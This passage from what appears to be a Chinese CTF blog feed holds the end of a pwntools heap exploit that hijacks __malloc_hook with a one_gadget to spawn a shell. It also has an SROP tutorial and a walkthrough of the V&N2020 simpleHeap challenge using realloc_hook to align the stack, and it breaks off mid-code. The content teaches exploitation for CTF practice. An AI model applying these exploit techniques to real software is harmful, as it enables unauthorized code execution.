class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;top&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;overloping&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x400</span>-<span class="number">0x10</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;/bin/sh\x00protect&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0X180</span>)<span class="comment">#+&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;top&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;1 : &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr-<span class="number">0x3c4b78</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook = libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc = libc_base+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;skye&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)),p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;skye&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">onegadget = libc_base + <span class="number">0x4526a</span><span class="comment">#0x4527a</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">11</span>+p64(onegadget)+p64(realloc))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x68</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SROP</title>
      <link href="archives/8b4e87b0/"/>
      <url>archives/8b4e87b0/</url>
      
        <content type="html"><![CDATA[<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SROP 的全称是 <strong>Sigreturn Oriented Programming</strong> 。这里<code>sigreturn</code>是一个系统调用，它在 unix 系统发生 signal 的时候会被间接地调用。</p><h2 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h2><p>简单来说就类 unix 系统中的一种中断信号机制，类似于单片机的各类中断服务信号，该机制常见步骤如下：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210426223222.png" alt="ProcessOfSignalHandlering"></p><p>当内核向某个进程发起（ deliver ）一个 signal ，该进程会被暂时挂起（ suspend ），进入内核（1），然后内核为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。跳转到之前注册好的 signal handler 中处理相应signal（2），当 signal handler 返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）。</p><h3 id="Signal-Frame-结构"><a href="#Signal-Frame-结构" class="headerlink" title="Signal Frame 结构"></a>Signal Frame 结构</h3><p>在第二步中被压入栈中，存储进程上下文的数据被称为 Signal Frame ，存放在用户进程的地址空间（栈）。下图中的绿、黄、橙色组成 Signal Frame 。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210426223230.png" alt="signal2-stack"></p><blockquote><p>中断后执行的 signal handler 使用的栈空间在上图的 sp 下方（低地址）</p></blockquote><p>对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext ：</p><ul><li>x86</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs, __gsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs, __fsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> es, __esh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ds, __dsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ecx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eax;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> trapno;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> err;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eip;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs, __csh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp_at_signal;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> oldmask;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>x64（64 位有图，见后文）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="keyword">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        swd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        fop;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="keyword">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="rt-sigreturn-恢复线程步骤"><a href="#rt-sigreturn-恢复线程步骤" class="headerlink" title="rt_sigreturn 恢复线程步骤"></a>rt_sigreturn 恢复线程步骤</h3><p>假设是 64 位系统，在第一个步时将如下的 Signal Frame 压入了栈上，接着跳转执行注册好的signal handler ，当 signal handler 执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler 函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用，恢复进程上下文。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210426223244.png" alt="srop-example-1"></p><h3 id="Signal-Frame-缺陷"><a href="#Signal-Frame-缺陷" class="headerlink" title="Signal Frame 缺陷"></a>Signal Frame 缺陷</h3><ol><li>这一部分 Signal Frame 是存储在用户进程的地址空间，用户进程具有读写权限。</li><li>内核恢复进程时，没有对 Signal Frame 进行前后对比，即可能恢复的进程与保持不一样。</li></ol><h2 id="简单单次利用"><a href="#简单单次利用" class="headerlink" title="简单单次利用"></a>简单单次利用</h2><p>控制用户进程的栈，那么它就可以伪造一个 Signal Frame，如下图所示，这里以 64 位为例子，给出 Signal Frame 更加详细的信息：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210426223245.png" alt="srop-example-1"></p><p>当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell 。</p><h2 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h2><p>如果需要执行一系列的函数，我们只需要做两处修改即可：</p><ul><li><strong>控制栈指针。</strong></li><li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong></li></ul><p>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210426223246.png"></p><h3 id="两个-gadget-在哪"><a href="#两个-gadget-在哪" class="headerlink" title="两个 gadget 在哪"></a>两个 gadget 在哪</h3><p>在某些 libc 中会存在，具体看参考文章，ctf 会在程序中预留。</p><p>sigreturn 这个 gadget 话可以用系统调用号代替。在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行 syscall 即可实现调用 syscall 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 read 函数的返回值为读取的字节数。</p><h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p>pwntools 中已经集成了对于 srop 的攻击，用 <strong>SigreturnFrame</strong> 生成 Signal Frame 。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="360-春秋杯-smallest-pwn"><a href="#360-春秋杯-smallest-pwn" class="headerlink" title="360 春秋杯 smallest-pwn"></a>360 春秋杯 smallest-pwn</h3><blockquote><p>system call chains 利用，多次调用 sigreturn </p></blockquote><h3 id="V-amp-N2020-公开赛-babybabypwn"><a href="#V-amp-N2020-公开赛-babybabypwn" class="headerlink" title="[V&amp;N2020 公开赛]babybabypwn"></a>[V&amp;N2020 公开赛]babybabypwn</h3><blockquote><p>system call chains 简单利用，控制恢复进程上下文后跳转执行写入的利用链</p></blockquote><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://www.freebuf.com/articles/network/87447.html">Sigreturn Oriented Programming (SROP) Attack攻击原理</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh">ctfwiki advanced rop</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>realloc_hook 调整栈帧使 onegadget 生效</title>
      <link href="archives/36f80a82/"/>
      <url>archives/36f80a82/</url>
      
        <content type="html"><![CDATA[<p>[scode type=”lblue”]文章首发于<a href="http://www.heetian.com/info/888">合天众智</a>，转载到博客仅作备份[/scode] </p><p>在某些堆的题目当中，由于限制只能使用 house of spirit 等方法劫持 malloc_hook ，这种情况一般是往 malloc_hook 写入 onegadget ，再次申请堆来 getshell 。</p><p>由于栈帧情况不满足，查询到的所有 onegadget 可能都打不通，这时就可以考虑下用 malloc_hook 和 realloc_hook 结合。先通过 realloc 调整栈帧，然后在运行 onegadget 。</p><h2 id="了解-realloc"><a href="#了解-realloc" class="headerlink" title="了解 realloc"></a>了解 realloc</h2><p>realloc 在库函数中的作用是重新调整 malloc 或 calloc 所分配的堆大小。它和 malloc 函数一样有 hook 函数，当 hook 函数不为空时，就会跳转运行 hook 函数（和 malloc_hook 一样的）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">realloc</span><span class="params">(<span class="keyword">signed</span> __int64 a1, <span class="keyword">unsigned</span> __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">……</span><br><span class="line"><span class="keyword">if</span> ( _realloc_hook )</span><br><span class="line"><span class="keyword">return</span> _realloc_hook(a1, a2, retaddr);</span><br><span class="line">    ……</span><br></pre></td></tr></table></figure><p>看看 realloc 的汇编代码：（可以把 libc 拖到 ida 中看，也可以泄露地址后 gdb 调试查看 <code>x /20i [addr]</code>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000846C0 realloc         proc near               ; DATA XREF: LOAD:0000000000006BA0↑o</span><br><span class="line">.text:00000000000846C0 ; __unwind &#123;</span><br><span class="line">.text:00000000000846C0                 push    r15             ; Alternative name is &#39;__libc_realloc&#39;</span><br><span class="line">.text:00000000000846C2                 push    r14</span><br><span class="line">.text:00000000000846C4                 push    r13</span><br><span class="line">.text:00000000000846C6                 push    r12</span><br><span class="line">.text:00000000000846C8                 mov     r13, rsi</span><br><span class="line">.text:00000000000846CB                 push    rbp</span><br><span class="line">.text:00000000000846CC                 push    rbx</span><br><span class="line">.text:00000000000846CD                 mov     rbx, rdi</span><br><span class="line">.text:00000000000846D0                 sub     rsp, 38h</span><br><span class="line">.text:00000000000846D4                 mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:00000000000846DB                 mov     rax, [rax]</span><br><span class="line">.text:00000000000846DE                 test    rax, rax</span><br><span class="line">.text:00000000000846E1                 jnz     loc_848E8; 跳转执行 realloc_hook</span><br><span class="line">.text:00000000000846E7                 test    rsi, rsi</span><br><span class="line">.text:00000000000846EA                 jnz     short loc_846F5</span><br><span class="line">.text:00000000000846EC                 test    rdi, rdi</span><br><span class="line">.text:00000000000846EF                 jnz     loc_84960</span><br></pre></td></tr></table></figure><p>函数一开始有很多的 push ，realloc 函数先执行 push 压栈，然后在跳转执行 realloc_hook 存储的函数。我们就是利用这些 push 调整栈帧。push 的数量发生变化会影响 rsp 的地址，这样就可以控制 rsp 的取值，从而满足 onegadget 的执行条件。除了可以控制 push 数量，还能通过偏移得到其他的 <code>push xxx</code> 。</p><h2 id="malloc-hook-与-realloc-hook-配合"><a href="#malloc-hook-与-realloc-hook-配合" class="headerlink" title="malloc_hook 与 realloc_hook 配合"></a>malloc_hook 与 realloc_hook 配合</h2><p>将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget ，实际运行顺序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc -&gt; malloc_hook -&gt; realloc -&gt; realloc_hook -&gt; onegadget</span><br></pre></td></tr></table></figure><p>这样就能经过 realloc 调整栈帧后再运行 onegadget 。实际情况中，并不是直接劫持 malloc_hook 为 realloc ，而是要加上一定的偏移，也就是调整 push 的数量，让栈帧结构满足 onegadget 运行。</p><p>realloc 这个偏移做题还是逐个试感觉快一点，因为设想是<strong>少一个 push ，rsp 就会向前移动一个内存单元，对应的 <code>[rsp+0x30]=[rsp+0x38]</code></strong> ，但实际上有少部分位置可能被其他东西写入改变了原来的值。自行调试体会一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 6个push</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /20gx <span class="variable">$rsp</span></span></span><br><span class="line">0x7fffffffdcb8:0x00007ffff7a9195f0x00007fffffffdd20</span><br><span class="line">0x7fffffffdcc8:0x00005555555548e00x00007fffffffde40</span><br><span class="line">0x7fffffffdcd8:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffdce8:0x00007ffff7a43ea00x00007fffffffde40</span><br><span class="line">0x7fffffffdcf8:0x00000000000000000x00007fffffffdd40</span><br><span class="line">0x7fffffffdd08:0x00005555555548e00x00007fffffffde40</span><br><span class="line">0x7fffffffdd18:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffdd28:0x0000555555554b710x00005555555548e0</span><br><span class="line">0x7fffffffdd38:0x00000010000000060x00007fffffffdd60</span><br><span class="line">0x7fffffffdd48:0x0000555555554f860x00007fffffffde40</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 5个push</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /20gx <span class="variable">$rsp</span></span></span><br><span class="line">0x7fffffffdcc0:0x00007ffff7a9195f0x00005555555548e0</span><br><span class="line">0x7fffffffdcd0:0x00007fffffffde400x0000000000000000</span><br><span class="line">0x7fffffffdce0:0x00000000000000000x00007ffff7a43ea0</span><br><span class="line">0x7fffffffdcf0:0x00007fffffffde400x0000555555554a23</span><br><span class="line">0x7fffffffdd00:0x00000000000000000x00007fffffffdd40</span><br><span class="line">0x7fffffffdd10:0x00005555555548e00x00007fffffffde40</span><br><span class="line">0x7fffffffdd20:0x00000000000000000x0000555555554b71</span><br><span class="line">0x7fffffffdd30:0x00005555555548e00x0000001000000006</span><br><span class="line">0x7fffffffdd40:0x00007fffffffdd600x0000555555554f86</span><br><span class="line">0x7fffffffdd50:0x00007fffffffde400x0000000100000000</span><br></pre></td></tr></table></figure><p>原理上是：**少一个 push ，rsp 就会向前移动一个内存单元，对应的 <code>[rsp+0x30]=[rsp+0x38]</code>**，但实际部分位置的值会变，所以逐个试，速度可能比计算快。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="V-amp-N2020-公开赛-simpleHeap"><a href="#V-amp-N2020-公开赛-simpleHeap" class="headerlink" title="[V&amp;N2020 公开赛]simpleHeap"></a>[V&amp;N2020 公开赛]simpleHeap</h3><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>一个基本的堆管理器，有增删查改功能。各项功能都是基于下标序号定位操作，上限为10个堆，大小为大于 0 、小于等于 0x6f 。没有结构体，基于两个列表存储堆信息。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>在修改函数里，调用函数 sub_C39 完成对堆信息的修改。传入的参数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_C39((__int64)chunk_ptr_list[v1], chunk_size_list[v1])</span><br></pre></td></tr></table></figure><p>在处理边界问题时，错误使用判断条件，导致溢出 1 字节，正确应该<code>if(i&gt;=size)</code>，具体逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_C39</span><span class="params">(__int64 ptr, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; size )                             <span class="comment">// off by one</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !read(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + ptr), <span class="number">1uLL</span>) )    <span class="comment">// 输出错误的异常处理</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + ptr) == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = i + ptr;</span><br><span class="line">      *(_BYTE *)result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>使用 off by one 伪造 chunk size，造成 chunk extend ，再利用 unsorted bin 的特点，泄露出 unsorted bin fd 指针的 libc 地址。</p><p>将上一步中的 chunk extend 剩下在 bin 中的内存申请出来，造成两个指针指向同一个地址，配合 edit 功能实现 houst of spirit ，劫持 __malloc_hook 。</p><p>实际测试后全部 onegadget 因为栈环境问题都无法打通，需要结合 malloc_hook 、 realloc_hook 调整栈环境才能打通。</p><hr><p>溢出修改 chunk size 造成 chunk extend ，chunk0 用于溢出 chunk1 ，chunk2 用于读取 unsorted bin fd 指针，chunk3 防止 fake chunk 与 topchunk 合并。溢出 size 是经过计算符合 house of spirit 要求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span 